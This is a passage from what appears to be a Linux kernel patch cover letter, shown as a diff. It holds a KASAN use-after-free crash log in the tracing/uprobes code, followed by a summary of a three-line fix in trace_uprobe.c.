+[  196.411305][ T9269]  ? handler_chain+0x211/0xd90
+[  196.411315][ T9269]  handler_chain+0x211/0xd90
+[  196.411378][ T9269]  ? __pfx_find_active_uprobe_rcu+0x10/0x10
+[  196.411388][ T9269]  ? _copy_to_user+0x48/0xd0
+[  196.411454][ T9269]  ? __pfx_handler_chain+0x10/0x10
+[  196.411464][ T9269]  ? emulate_push_stack+0xfd/0x160
+[  196.411495][ T9269]  ? __pfx_emulate_push_stack+0x10/0x10
+[  196.411520][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.411586][ T9269]  ? lock_acquire+0x303/0x360
+[  196.411601][ T9269]  ? uprobe_notify_resume+0x406/0xa70
+[  196.411622][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.411631][ T9269]  ? uprobe_pre_sstep_notifier+0xbc/0xe0
+[  196.411642][ T9269]  uprobe_notify_resume+0x420/0xa70
+[  196.411653][ T9269]  ? __pfx_uprobe_notify_resume+0x10/0x10
+[  196.411662][ T9269]  ? notify_die+0xc7/0x1a0
+[  196.411687][ T9269]  ? __pfx_notify_die+0x10/0x10
+[  196.411696][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.411705][ T9269]  exit_to_user_mode_loop+0x7c/0x560
+[  196.411723][ T9269]  exc_int3+0x2f5/0x3d0
+[  196.411745][ T9269]  asm_exc_int3+0x39/0x40
+[  196.411771][ T9269] RIP: 0033:0x562b2c30a125
+[  196.411795][ T9269] Code: 2f 00 00 e8 2d ff ff ff e8 68 ff ff ff c6 05 19 2fc
+[  196.411801][ T9269] RSP: 002b:00007fff88b86b38 EFLAGS: 00000287
+[  196.411817][ T9269] RAX: 00000000000808b1 RBX: 0000000000000000 RCX: 00007f28
+[  196.411821][ T9269] RDX: 00007fff88b86c58 RSI: 00007fff88b86c48 RDI: 00000001
+[  196.411825][ T9269] RBP: 00007fff88b86b50 R08: 0000000000000000 R09: 00007f20
+[  196.411829][ T9269] R10: 0000000000000000 R11: 0000000000000002 R12: 00005620
+[  196.411833][ T9269] R13: 0000000000000000 R14: 0000000000000000 R15: 00000000
+[  196.411838][ T9269]  </TASK>
+[  196.411841][ T9269] 
+[  196.435201][ T9269] Allocated by task 9257:
+[  196.435604][ T9269]  kasan_save_stack+0x33/0x60
+[  196.436083][ T9269]  kasan_save_track+0x14/0x30
+[  196.436504][ T9269]  __kasan_kmalloc+0xaa/0xb0
+[  196.436911][ T9269]  __kmalloc_noprof+0x319/0x820
+[  196.437339][ T9269]  alloc_trace_uprobe+0x8a/0x230
+[  196.437948][ T9269]  __trace_uprobe_create+0x50e/0x14c0
+[  196.438472][ T9269]  trace_probe_create+0xef/0x100
+[  196.438935][ T9269]  dyn_event_create+0x34/0x50
+[  196.439376][ T9269]  create_or_delete_trace_uprobe+0x3f/0x90
+[  196.440071][ T9269]  trace_parse_run_command+0x136/0x340
+[  196.440544][ T9269]  vfs_write+0x242/0xad0
+[  196.440981][ T9269]  ksys_write+0x103/0x1f0
+[  196.441340][ T9269]  do_syscall_64+0x116/0x800
+[  196.441957][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  196.442475][ T9269] 
+[  196.442688][ T9269] Freed by task 9257:
+[  196.443024][ T9269]  kasan_save_stack+0x33/0x60
+[  196.443428][ T9269]  kasan_save_track+0x14/0x30
+[  196.443837][ T9269]  kasan_save_free_info+0x3b/0x60
+[  196.444452][ T9269]  __kasan_slab_free+0x5f/0x80
+[  196.444851][ T9269]  kfree+0x2e2/0x6c0
+[  196.445175][ T9269]  trace_uprobe_release+0x16f/0x220
+[  196.445607][ T9269]  dyn_event_release+0x241/0x380
+[  196.446081][ T9269]  create_or_delete_trace_uprobe+0x74/0x90
+[  196.446690][ T9269]  trace_parse_run_command+0x136/0x340
+[  196.447165][ T9269]  vfs_write+0x242/0xad0
+[  196.447546][ T9269]  ksys_write+0x103/0x1f0
+[  196.448022][ T9269]  do_syscall_64+0x116/0x800
+[  196.448452][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  196.448976][ T9269] 
+[  196.449179][ T9269] The buggy address belongs to the object at ffff8880346970
+[  196.449179][ T9269]  which belongs to the cache kmalloc-256 of size 256
+[  196.450363][ T9269] The buggy address is located 24 bytes inside of
+[  196.450363][ T9269]  freed 256-byte region [ffff888034697c00, ffff888034697d)
+[  196.451485][ T9269] 
+[  196.451779][ T9269] The buggy address belongs to the physical page:
+[  196.452511][ T9269] page: refcount:0 mapcount:0 mapping:0000000000000000 ind6
+[  196.453494][ T9269] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapp0
+[  196.454289][ T9269] flags: 0xfff00000000240(workingset|head|node=0|zone=1|la)
+[  196.455051][ T9269] page_type: f5(slab)
+[  196.455599][ T9269] raw: 00fff00000000240 ffff888017841b40 ffffea0001280610 0
+[  196.456365][ T9269] raw: ffff888034697e00 000000080010000c 00000000f5000000 0
+[  196.457411][ T9269] head: 00fff00000000240 ffff888017841b40 ffffea00012806100
+[  196.458155][ T9269] head: ffff888034697e00 000000080010000c 00000000f50000000
+[  196.458907][ T9269] head: 00fff00000000001 ffffffffffffff81 00000000fffffffff
+[  196.459818][ T9269] head: ffffffffffffffff 0000000000000000 00000000ffffffff2
+[  196.460634][ T9269] page dumped because: kasan: bad access detected
+[  196.461219][ T9269] page_owner tracks the page as allocated
+[  196.461786][ T9269] page last allocated via order 1, migratetype Unmovable, 0
+[  196.463981][ T9269]  post_alloc_hook+0xe6/0x100
+[  196.464422][ T9269]  get_page_from_freelist+0x55c/0x2210
+[  196.464900][ T9269]  __alloc_frozen_pages_noprof+0x221/0x1cb0
+[  196.465499][ T9269]  new_slab+0xa2/0x5f0
+[  196.465860][ T9269]  refill_objects+0xe3/0x430
+[  196.466251][ T9269]  __pcs_replace_empty_main+0x2ed/0x650
+[  196.466711][ T9269]  __kmalloc_cache_noprof+0x576/0x6e0
+[  196.467281][ T9269]  inode_doinit_use_xattr+0x42/0x2e0
+[  196.467824][ T9269]  inode_doinit_with_dentry+0x9a6/0x9d0
+[  196.468314][ T9269]  selinux_d_instantiate+0x26/0x30
+[  196.468737][ T9269]  security_d_instantiate+0x142/0x180
+[  196.469330][ T9269]  d_splice_alias_ops+0x7c/0x680
+[  196.469792][ T9269]  kernfs_iop_lookup+0x16a/0x1a0
+[  196.470333][ T9269]  path_openat+0x17b0/0x27b0
+[  196.470815][ T9269]  do_file_open+0x1b1/0x2f0
+[  196.471420][ T9269]  do_sys_openat2+0xf7/0x1b0
+[  196.471868][ T9269] page last free pid 4982 tgid 4982 stack trace:
+[  196.472760][ T9269]  __free_frozen_pages+0x52d/0x960
+[  196.473191][ T9269]  pgd_free+0x277/0x2e0
+[  196.473605][ T9269]  __mmdrop+0xd1/0x380
+[  196.473962][ T9269]  __mmput+0x26d/0x270
+[  196.474381][ T9269]  mmput+0x62/0x70
+[  196.474762][ T9269]  setup_new_exec+0x131/0x170
+[  196.475271][ T9269]  load_elf_binary+0x78f/0x3400
+[  196.475716][ T9269]  bprm_execve+0x68f/0xfb0
+[  196.476088][ T9269]  do_execveat_common.isra.0+0x2ef/0x360
+[  196.476644][ T9269]  __x64_sys_execve+0x5d/0x80
+[  196.477152][ T9269]  do_syscall_64+0x116/0x800
+[  196.477707][ T9269]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  196.478260][ T9269] 
+[  196.478500][ T9269] Memory state around the buggy address:
+[  196.479110][ T9269]  ffff888034697b00: fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  196.480054][ T9269]  ffff888034697b80: fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  196.481482][ T9269] >ffff888034697c00: fa fb fb fb fb fb fb fb fb fb fb fb fb
+[  196.482277][ T9269]                             ^
+[  196.483019][ T9269]  ffff888034697c80: fb fb fb fb fb fb fb fb fb fb fb fb fb
+[  196.483936][ T9269]  ffff888034697d00: fc fc fc fc fc fc fc fc fc fc fc fc fc
+[  196.484720][ T9269] =========================================================
+[  196.487203][ T9269] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  196.488061][ T9269] CPU: 1 UID: 0 PID: 9269 Comm: u4a_target Not tainted 7.0 
+[  196.489283][ T9269] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
+[  196.490632][ T9269] Call Trace:
+[  196.490978][ T9269]  <TASK>
+[  196.491419][ T9269]  dump_stack_lvl+0x3b/0x1f0
+[  196.491991][ T9269]  vpanic+0x8b4/0x930
+[  196.492414][ T9269]  ? __pfx_vpanic+0x10/0x10
+[  196.492865][ T9269]  ? handler_chain+0x211/0xd90
+[  196.493446][ T9269]  panic+0xca/0xd0
+[  196.493917][ T9269]  ? __pfx_panic+0x10/0x10
+[  196.494538][ T9269]  ? handler_chain+0x211/0xd90
+[  196.495034][ T9269]  ? preempt_schedule_thunk+0x16/0x40
+[  196.495658][ T9269]  ? preempt_schedule_common+0x3b/0x80
+[  196.496407][ T9269]  ? preempt_schedule_thunk+0x16/0x40
+[  196.497011][ T9269]  ? check_panic_on_warn+0x1f/0xb0
+[  196.497529][ T9269]  check_panic_on_warn+0xab/0xb0
+[  196.498031][ T9269]  end_report+0x132/0x180
+[  196.498438][ T9269]  kasan_report+0xf4/0x120
+[  196.498942][ T9269]  ? handler_chain+0x211/0xd90
+[  196.499460][ T9269]  handler_chain+0x211/0xd90
+[  196.499916][ T9269]  ? __pfx_find_active_uprobe_rcu+0x10/0x10
+[  196.500500][ T9269]  ? _copy_to_user+0x48/0xd0
+[  196.500978][ T9269]  ? __pfx_handler_chain+0x10/0x10
+[  196.501508][ T9269]  ? emulate_push_stack+0xfd/0x160
+[  196.502006][ T9269]  ? __pfx_emulate_push_stack+0x10/0x10
+[  196.502542][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.503067][ T9269]  ? lock_acquire+0x303/0x360
+[  196.503523][ T9269]  ? uprobe_notify_resume+0x406/0xa70
+[  196.504144][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.504686][ T9269]  ? uprobe_pre_sstep_notifier+0xbc/0xe0
+[  196.505228][ T9269]  uprobe_notify_resume+0x420/0xa70
+[  196.505748][ T9269]  ? __pfx_uprobe_notify_resume+0x10/0x10
+[  196.506363][ T9269]  ? notify_die+0xc7/0x1a0
+[  196.506815][ T9269]  ? __pfx_notify_die+0x10/0x10
+[  196.507293][ T9269]  ? rcu_is_watching+0x3d/0x80
+[  196.507796][ T9269]  exit_to_user_mode_loop+0x7c/0x560
+[  196.508436][ T9269]  exc_int3+0x2f5/0x3d0
+[  196.508922][ T9269]  asm_exc_int3+0x39/0x40
+[  196.509382][ T9269] RIP: 0033:0x562b2c30a125
+[  196.509872][ T9269] Code: 2f 00 00 e8 2d ff ff ff e8 68 ff ff ff c6 05 19 2fc
+[  196.511725][ T9269] RSP: 002b:00007fff88b86b38 EFLAGS: 00000287
+[  196.512366][ T9269] RAX: 00000000000808b1 RBX: 0000000000000000 RCX: 00007f28
+[  196.513212][ T9269] RDX: 00007fff88b86c58 RSI: 00007fff88b86c48 RDI: 00000001
+[  196.513986][ T9269] RBP: 00007fff88b86b50 R08: 0000000000000000 R09: 00007f20
+[  196.514742][ T9269] R10: 0000000000000000 R11: 0000000000000002 R12: 00005620
+[  196.515546][ T9269] R13: 0000000000000000 R14: 0000000000000000 R15: 00000000
+[  196.516410][ T9269]  </TASK>
+[  196.517369][ T9269] Kernel Offset: disabled
+[  196.517836][ T9269] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Luxiao Xu & Ren Wei
+
+Luxiao Xu (1):
+  tracing/uprobes: Reject unregistering enabled trace_uprobe to prevent
+    UAF
+
+ kernel/trace/trace_uprobe.c | 3 +++
+ 1 file changed, 3 insertions(+)
 
 -- 
-2.34.1
+2.43.0
 
